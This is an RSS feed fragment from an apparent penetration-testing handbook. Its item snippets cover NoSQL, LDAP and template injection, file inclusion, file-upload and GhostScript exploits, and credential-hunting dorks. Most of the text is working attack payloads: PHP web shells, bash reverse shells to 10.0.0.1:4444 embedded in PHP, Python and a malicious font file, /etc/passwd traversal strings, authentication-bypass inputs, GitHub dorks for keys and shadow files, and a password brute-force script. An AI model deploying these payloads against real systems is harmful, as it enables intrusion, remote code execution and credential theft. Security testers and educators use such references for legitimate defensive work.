      <description>Manual Injection linkSee also Web Login Bypass NoSQL Injection.&#xA;Mongo linkIf the web application uses MongDB, you might be able to fetch the user&amp;rsquo;s information.&#xA;It allows you to bypass authentication.&#xA;/?username=admin&amp;amp;password[$ne]=xyz /?username[$ne]=admin&amp;amp;role=guest /?id[$gt]=1&amp;amp;username=john Syntax&#xA;Below are the payloads to syntax injection. Don’t forget to try the URL-encoded payloads.&#xA;test||1==1 test%7C%7C1%3D%3D1 test||1==1// test%7C%7C1%3D%3D1%2F%2F test||1==1%00 test%7C%7C1%3D%3D1%2500 test||1==1\u0000 test%7C%7C1%3D%3D1%5Cu0000 test||&amp;#39;1==1 test%7C%7C%271%3D%3D1 test||&amp;#39;1&amp;#39;==&amp;#39;1&amp;#39; test%7C%7C%271%27%3D%3D%271%27 test||&amp;#39;1&amp;#39;==&amp;#39;1 test%7C%7C%271%27%3D%3D%271 test&amp;#39;||1||&amp;#39; test%27%7c%7c%31%7c%7c%27 &amp;lt;!-- Find specific fields e.g. &amp;#39;password&amp;#39; --&amp;gt; admin&amp;#39; &amp;amp;&amp;amp; this.</description>
    </item>
    <item>
      <title>PHP RCE Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</link>
      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</guid>
      <description>Web Shell link &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;%3fphp&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;echo&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; We can access to /?cmd=whoami.&#xA;Reverse Shell link &amp;lt;?php system(&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;);?&amp;gt; &amp;lt;?php system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;);?&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#39;);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-c&amp;#43;&amp;#34;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#34;&amp;#39;);%3f&amp;gt; </description>
    </item>
    <item>
      <title>Subdomain Discovery</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/subdomain-discovery/</link>
      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/subdomain-discovery/</guid>
      <description>Automation link # https://github.com/projectdiscovery/subfinder subfinder -d example.com subfinder -d example.com -o domains.txt # https://github.com/blechschmidt/massdns ./scripts/subbrute.py lists/names.txt example.com | ./bin/massdns -r lists/resolvers.txt -t A -o S &amp;gt; results.txt # https://github.com/guelfoweb/knock knockpy vulnerable.com # Using wordlist knockpy -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt vulnerable.com # https://github.com/lc/gau printf example.com | gau cat domains.txt | gau --threads 5 # https://github.com/aboul3la/Sublist3r python3 sublist3r.py -d example.com # This sends requests a target web server directly so be careful # -mc: Match status code ffuf -u https://FUZZ.</description>
    </item>
    <item>
      <title>File Inclusion (LFI/RFI)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</link>
      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</guid>
      <description>Local File Inclusion (LFI) link ?page=../ ?page=/etc/passwd ?page=../../../../etc/passwd ?page=../../../../../etc/passwd ?page=..//..//..//..//..//etc/passwd ?page=....//....//....//....//etc/passwd ?page=....//....//....//....//....//....//etc/passwd ?page=.....///.....///.....///.....///etc/passwd ?page=../../../../../../../../../../../../../../etc/passwd ?page=..\/..\/..\/..\/etc/passwd ?page=/etc/passwd&amp;amp; ?page=/etc/passwd%00 ?page=example.php%00.txt ?page=/etc/passwd%00.inc ?page=/etc/passwd%00.php ?page=http://localhost/index ?page=http://localhost:3000/index.html ?page=http://localhost:8000/index.html ?page=somedir/../../../../etc/passwd&amp;amp;ext= # URL encoding ?page=..%2F..%2F..%2F..%2Fetc/passwd ?page=..%5C..%5C..%5C..%5Cetc/passwd ?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd ?page=http:%5C%5Cindex # URL double encoding ?page=..%252F..%252F..%252F..%252fetc/passwd ?page=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd ?page=http:%252F%252Findex # UTF-8 encoding ?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd # Dot truncation ?page=../../../../etc/passwd.......................................................... # File scheme ?page=file:///etc/passwd ?page=file:%2F%2F%2Fetc%2Fpasswd ?page=file:%252F%252F%252Fetc%252Fpasswd ?page=file%3A///etc/passwd ?page=file%3A%2F%2F%2Fetc%2Fpasswd ?page=file%3A%252F%252F%252Fetc%252Fpasswd ?page=file://var/www/html/index.php ?page=file://var/www/&amp;lt;subdomain&amp;gt;/index.php # Other local web servr ?page=http://127.0.0.1/ ?page=http://127.0.0.1:3000/ ?page=http://127.0.0.1:8000/ # PHP Filter ?page=php://filter/resource=/etc/passwd ?page=php://filter/read=string.rot13/resource=index.php ?</description>
    </item>
    <item>
      <title>Werkzeug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</link>
      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</guid>
      <description>SSTI linkPlease see Flask Jinja2 SSTI&#xA;Remote Code Execution (RCE) in Console linkMetasploit link msfconsole msf&amp;gt; use exploit/multi/http/werkzeug_debug_rce Manual Exploitation linkIf we can access to /console page, we may be able to execute RCE.&#xA;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read(); import os; print(os.popen(&amp;#34;whoami&amp;#34;).read()) # Reverse shell __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;).read() Console PIN Exploit linkReference: https://www.daehee.com/werkzeug-console-pin-exploit/&#xA;If the website is locked by PIN code in the /console page, you need to unlock it.</description>
    </item>
    <item>
      <title>GitHub Dorks</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/github-dorks/</link>
      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/github-dorks/</guid>
      <description>Common Credentials link path:.env path:.env passwd path:.env password path:.env secret path:*.env api path:*.env passwd path:*.env password path:*.env secret path:config.* auth path:config.* password path:config.* passwd path:config.* token path:config.json password &amp;#34;example.com&amp;#34; password &amp;#34;example.com&amp;#34; passwd &amp;#34;example.com&amp;#34; credential &amp;#34;example.com&amp;#34; creds Web Conf link path:.htpasswd WordPress link path:wp-config.php Databases link path:.pgpass path:my.cnf path:redis.conf path:mongod.conf Git link path:.git-credentials Bash link path:.bash_history path:.bash_profile path:.bashrc path:.profile path:.bashrc password path:.bash_history root path:etc/passwd path:etc/shadow path:password.* SSH link path:id_rsa path:private_key path:.ssh/id_rsa Docker link path:docker.</description>
    </item>
    <item>
      <title>Flask Jinja2 Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</guid>
      <description>Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.&#xA;If so, URL encode the payload or convert to HEX.&#xA;In addition, it’s recommended to send requests using Burp Suite because web browsers automatically update the payload.&#xA;First, try below payloads.&#xA;{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.</description>
    </item>
    <item>
      <title>LDAP Injection</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</guid>
      <description>Basic Payloads link (&amp;amp;uid=*)(userPassword=*) (&amp;amp;uid=*)|(userPassword=*) (&amp;amp;uid=*)|(objectClass=*)(userPassword=password123) *)(uid=*))(|(password=*) </description>
    </item>
    <item>
      <title>SQL Injection with Sqlmap</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</guid>
      <description>Basic Usage link # GET request sqlmap -u &amp;#34;http://&amp;lt;target-ip&amp;gt;/?search=test&amp;#34; Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.&#xA;In Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the &amp;quot;-r&amp;quot; flag as below.&#xA;sqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.</description>
    </item>
    <item>
      <title>Spring Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</link>
      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</guid>
      <description>Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.&#xA;Enumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.&#xA;Try them:&#xA;2*2 #{2*2} *{2*2} Then you can also check more about that.</description>
    </item>
    <item>
      <title>Shared Library Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
    </item>
    <item>
      <title>Zip &amp; Unzip</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/zip-unzip/</link>
      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/zip-unzip/</guid>
      <description>Compress link zip &amp;lt;output&amp;gt; &amp;lt;target1&amp;gt; &amp;lt;target2&amp;gt; ... zip example.zip example1.txt example2.txt # -r: recursive (zip folder) zip -r example.zip ./example Symbolic Links linkWe can store symbolic links in a zip file.&#xA;ln -s /etc/passwd test.txt zip --symlink test.zip test.txt Decompress link unzip example.zip # Specify the directory to decompress unzip example.zip -d ./example List Files without Decompressings linkTo list files in a zip file without extracting, use -l flag.&#xA;unzip -l example.</description>
    </item>
    <item>
      <title>Business Logic Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</guid>
      <description>Change Request Params to Unexpected Values link productId=-1 productId=a productId= # empty value productId=1&amp;amp;price=-1000 Exploit Broken Two-Factor linkBrute force a MFA Code link POST /login HTTP/1.1 Cookie: verify=victim ... &amp;lt;!-- Brute force digits code --&amp;gt; mfa-code=1111 Loop Back with 2,147,483,647 linkNo contents yet.&#xA;Register with Too Long-Length Email Address link POST /register HTTP/1.1 ... username=attacker&amp;amp;password=pass1&amp;amp;email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com Remove the Specific POST Params link POST /change-password HTTP/1.1 ... &amp;lt;!-- Remove &amp;#39;current-password&amp;#39; parameter --&amp;gt; username=admin&amp;amp;new-password-1=newpass&amp;amp;new-password-2=newpass </description>
    </item>
    <item>
      <title>Dompdf RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</link>
      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</guid>
      <description>Exploitation link1. Create Malicious Font linkFirst off, we need to prepare the malicious .ttf file.&#xA;Here, we find the .ttf file in our local system and copy it to the current directory and change the extention ttf to php because we want to execute PHP script.&#xA;find / -name &amp;#34;*.ttf&amp;#34; 2&amp;gt;/dev/null cp /path/to/example.ttf ./evil.php Then add the PHP payload at the end of the file.&#xA;... &amp;lt;?php system(&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    <item>
      <title>M365 (Microsoft Office 365) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</link>
      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/</guid>
      <description>Enumeration linkPassword Spraying linkWe may spray user passwords with open-source tools as below.&#xA;MFASweap o365spray </description>
    </item>
    <item>
      <title>Redis SSRF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</link>
      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</guid>
      <description>Investigation linkIf the target server runs Redis server and the website interacts with the Redis server, we can modify the key value in the Redis and reflects the result through SSRF using gopher.&#xA;url=http://evil.com/ Exploitation linkAutomation linkWe can use Gopherus to create a payload.&#xA;Payload Manually linkTo make the payload for SSRF manually, we need to know what commands to insert.&#xA;To make it clear, try to demonstrate the command (RESP format) to update the target key value in Redis.</description>
    </item>
    <item>
      <title>Windows Memory Dump Analysis</title>
      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-memory-dump-analysis/</link>
      <pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-memory-dump-analysis/</guid>
      <description>Investigation link file example.dmp # Output example.dmp: Mini DuMP crash report, 18 streams, Sat Nov ... Static Analysis linkWe can also read contents of this file by usual static analysis such as below.&#xA;strings example.dmp strings example.dmp | grep -i password # Open pager strings example.dmp | less xxd example.dmp Using Debugger link IDA, ILSpy Visual Studio Using Online Viewer linkThis file can also be read with online DMP viewer.</description>
    </item>
    <item>
      <title>Broken Link Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</link>
      <pubDate>Sat, 26 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</guid>
      <description>Investigation linkAssume that target website loads external JavaScript file in example.com no longer exists as below.&#xA;&amp;lt;script src=&amp;#34;//example.com/script.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; If attacker bought this domain, he can host arbitrary JavaScript file named script.js in the example.com root directory.&#xA;Exploitation Examples linkAttacker can write arbitrary code for compromising users in script.js as example above.&#xA;For example, if target website includes sensitive information of authenticated user in the page where the broken link is loaded, attackers can send these information to their owned server.</description>
    </item>
    <item>
      <title>File Upload Attack on Exiftool</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</guid>
      <description>Polyglot Attack linkWe might be able to execute remote code by polyglotting the original plain image file.&#xA;At first, create a blank image file as below, but this step may be not required if you already have some image file.&#xA;convert -size 32x32 xc:white test.jpg Then insert OS command with exiftool.&#xA;exiftool -Comment=&amp;#34;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;#34; example.png exiftool -Comment=&amp;#39;&amp;lt;?php echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#39; exploit.png exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; . file_get_contents(&amp;#39;/etc/passwd&amp;#39;) .</description>
    </item>
    <item>
      <title>File Upload Attack on ImageMagick</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</guid>
      <description>This page is no content yet, but please refer to the references below to achieve this attack.</description>
    </item>
    <item>
      <title>Find Leaked API Keys</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/find-leaked-api-keys/</link>
      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/find-leaked-api-keys/</guid>
      <description>Awesome Resources link Keyhacks&#xA;This repository lists quick ways to find API keys of various providers.&#xA;Google Dorks linkGoogle Dorks is useful to search leaked API keys/tokens.&#xA;*Here is the simple example so might be unuseful. Please see Awesome Resources section if you are seriously looking for that.&#xA;Common APIs linkTry changing the site domain and the extensions e.g. js, py, go.&#xA;# GitHub repositories site:github.com ext:php &amp;#34;api-key&amp;#34; site:github.com ext:php &amp;#34;api_key&amp;#34; site:github.</description>
    </item>
    <item>
      <title>IDOR (Insecure Direct Object References) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</link>
      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</guid>
      <description>Find Vulnerabilities from HTML Source Code linkFirst check values of attributes on input elements.&#xA;&amp;lt;input name=&amp;#34;user_id&amp;#34; value=&amp;#34;8&amp;#34; &amp;gt; Then try what will happen when you change the Cookie value in a HTTP header.&#xA;Cookie: user_id=12 Change GET Parameters linkManual link /user?id=1 /user?id=2 /user?id=-1 /user?id=00 /admin/posts/1 /admin/posts/-1 /admin/posts/00 /static/1.txt /static/2.txt /static/-1.txt /static/00.txt Automation link seq 0 100 | ffuf -u https://example.com/user?id=FUZZ -w - wfuzz -z file,./numbers.txt https://example.com/user?id=FUZZ Change POST Parameters link address=1&amp;amp;user_id=1 address=1&amp;amp;user_id=2 # URL Encode &amp;#39;&amp;amp;&amp;#39; address=1%26user_id=2 </description>
    </item>
    <item>
      <title>Client-Side JavaScript Validation Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</link>
      <pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</guid>
      <description>Investigation linkFor example, assume that website modifies user input then validation check when logged in as the following JavaScript (e.g. validation.js).&#xA;// validation.js function validate() { let username = document.getElementById(&amp;#34;username&amp;#34;).value; let password = document.getElementById(&amp;#34;password&amp;#34;).value; // Change the username input if it contains &amp;#34;admin&amp;#34; to confuse attackers. username = username.replace(/admin/g, &amp;#34;noob&amp;#34;); // If the input value of the username/password are both &amp;#34;admin&amp;#34;, we can bypass this validation. if (username === &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; password === &amp;#34;admin&amp;#34;) { return true; } return false; } By the way, this example may not exist in real world because it’s too simple.</description>
    </item>
    <item>
      <title>Reading OneDrive Logs</title>
      <link>https://documentnation.github.io/docs/hdks/windows/forensics/reading-onedrive-logs/</link>
      <pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/reading-onedrive-logs/</guid>
      <description>Deobfuscating Log Files linkTo read OneDrive logs, we need to deobfuscate log files (.odl, .odlsent, .odlgz).&#xA;These logs are located in the following on Windows:&#xA;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Personal\ C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Business1\ This repository is useful to deobfuscate OneDrive logs.&#xA;python -m venv venv # on Windows .\venv\Scripts\activate pip install construct pycryptodome python odl.py -o .\output.csv c:\Users\\AppData\Local\Microsoft\OneDrive\logs\Personal\ After that, we can read the output file (output.csv) with tools such as VS Code and Excel.&#xA;This file contains sensitive information such as OneDrive account email, access token, etc.</description>
    </item>
    <item>
      <title>Add Custom HTTP Headers in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/add-custom-http-headers-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/add-custom-http-headers-in-burp-suite/</guid>
      <description>Add Custom HTTP Headers linkIn some cases such as bug bounty programs, it may be convenient to set custom HTTP headers in advance.&#xA;Go to Proxy -&amp;gt; Options tab.&#xA;Scroll down to &amp;ldquo;Match and Replace&amp;rdquo;.&#xA;Click on &amp;ldquo;Add&amp;rdquo;.&#xA;Set rule:&#xA;User Agent&#xA;Type: Request header Match: ^User-Agent.*$ Replace: User-Agent: HackerOne-username Comment: New Original Header&#xA;Type: Request header Match: (empty) Replace: X-Bug-Bounty: HackerOne-username Comment: Check the box of &amp;ldquo;Regex match&amp;rdquo;.&#xA;Click on &amp;ldquo;OK&amp;rdquo;.</description>
    </item>
    <item>
      <title>Automate Sequence Requests with Burp Intruder</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/automate-sequence-requests-with-burp-intruder/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/automate-sequence-requests-with-burp-intruder/</guid>
      <description>Automation link &amp;ldquo;Project options&amp;rdquo; -&amp;gt; &amp;ldquo;Sessions&amp;rdquo; -&amp;gt; &amp;ldquo;Session handling rules&amp;rdquo; panel -&amp;gt; Click &amp;ldquo;Add&amp;rdquo;. The &amp;ldquo;Session handling rules editor&amp;rdquo; opens. &amp;ldquo;Scope&amp;rdquo; tab -&amp;gt; Select &amp;ldquo;Include all URLs&amp;rdquo;. &amp;ldquo;Details&amp;rdquo; tab -&amp;gt; Under &amp;ldquo;Rule actions&amp;rdquo; -&amp;gt; Click &amp;ldquo;Add&amp;rdquo; -&amp;gt; &amp;ldquo;Run a macro&amp;rdquo; -&amp;gt; Under &amp;ldquo;Select macro&amp;rdquo; -&amp;gt; Click &amp;ldquo;Add&amp;rdquo;. The &amp;ldquo;Macro Recorder&amp;rdquo; opens. Select the sequence of requests as follows: POST /message/submit GET /message POST /account Click &amp;ldquo;OK&amp;rdquo;. Manage Parameters link In the list of requests, select the requests in which specific value used POST parameter changes.</description>
    </item>
    <item>
      <title>Integrate Burp Request and SQLmap</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/integrate-burp-request-and-sqlmap/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/integrate-burp-request-and-sqlmap/</guid>
      <description>Download Request File in Burp Suite link Right click on the request field in Burp Suite. Click &amp;ldquo;Save item&amp;rdquo; or &amp;ldquo;Copy to file&amp;rdquo; to download the request state. Save as &amp;ldquo;request.txt&amp;rdquo; (this is arbitrary name). Using Request File in SQLmap linkAfter downloading the request file in Burp Suite as the previous section, we can use when running SQLmap.&#xA;sqlmap -r request.txt By the way, we can see what SQLmap send payloads to websites by adding the --proxy flag.</description>
    </item>
    <item>
      <title>SOCKS Proxy in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/socks-proxy-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/socks-proxy-in-burp-suite/</guid>
      <description>Setup SOCKS Proxy link In Burp Suite, go to Proxy → Proxy settings.&#xA;In the settings window, select User tab and go to Netwotk → Connections in left pane.&#xA;In the SOCKS proxy section, enable &amp;ldquo;Override options for this project only&amp;rdquo;.&#xA;Fill proxy host and port as follow:&#xA;SOCKS proxy host: 127.0.0.1 SOCKS proxy port: 9251 Check &amp;ldquo;Use SOCKS proxy&amp;rdquo; and close the window.</description>
    </item>
    <item>
      <title>Turbo Intruder in Burp Suite</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/turbo-intruder-in-burp-suite/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/turbo-intruder-in-burp-suite/</guid>
      <description>Using Single Parameter linkSet “%s” to the parameter for brute force.&#xA;For example, set %s as the value of password then we can brute force to password.&#xA;POST /login HTTP/1.1 ... username=admin&amp;amp;password=%s Here is the Python cheat sheet. We can use either code depending on the situation.&#xA;def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=5, pipeline=False ) # Brute force (wordlist) for word in open(&amp;#39;/usr/share/wordlists/rockyou.txt&amp;#39;): engine.queue(target.req, word.rstrip()) # Brute force (0 - 255) for i in range(0, 255): engine.</description>
    </item>
    <item>
      <title>Web Race Condition Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</guid>
      <description>Investigation linkIf target website has the functionality that logged-in user can apply the 10% off code for buying products, the code must be applied only one time most of the time. However, this rule might be bypassed by exploiting race condition vulnerability with concurrent requests.&#xA;Race Condition Attack using Turbo Intruder in Burp Suite linkWe can easily achieve race condition attack by using Turbo Intruder.&#xA;In Burp Suite, right-click on specific request.</description>
    </item>
    <item>
      <title>Prototype Pollution in Server-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
    </item>
    <item>
      <title>GhostScript Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</guid>
      <description>Arbitrary Command Execution (CVE-2018-16509) Before v9.24 linkReference: https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509&#xA;If target website uses the functionality which allows user to upload image files associated Python&amp;rsquo;s Pillow (PIL), we can execute remote command over GhostScript vulnerability (-dSAFER bypass using OutputFile).&#xA;Create an image file in which contents as below, then upload it. Command will be executed in the target server.&#xA;%!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: -0 -0 100 100 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%touch /tmp/hello.</description>
    </item>
    <item>
      <title>Python Pickle RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</guid>
